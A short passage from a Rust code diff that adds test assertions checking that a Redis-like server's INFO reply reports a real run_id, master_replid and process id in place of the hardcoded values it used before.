+        let text = String::from_utf8_lossy(&reply);
+        // A per-process run_id/master_replid and the real pid replace the old frozen stub, which
+        // had no run_id and baked in process_id:1 / uptime_in_seconds:3600.
+        assert!(text.contains("run_id:"), "INFO missing run_id");
+        assert!(
+            text.contains("master_replid:"),
+            "INFO missing master_replid"
+        );
+        assert!(
+            text.contains(&format!("process_id:{}", std::process::id())),
+            "INFO process_id is not the real pid"
+        );
+    }
+}
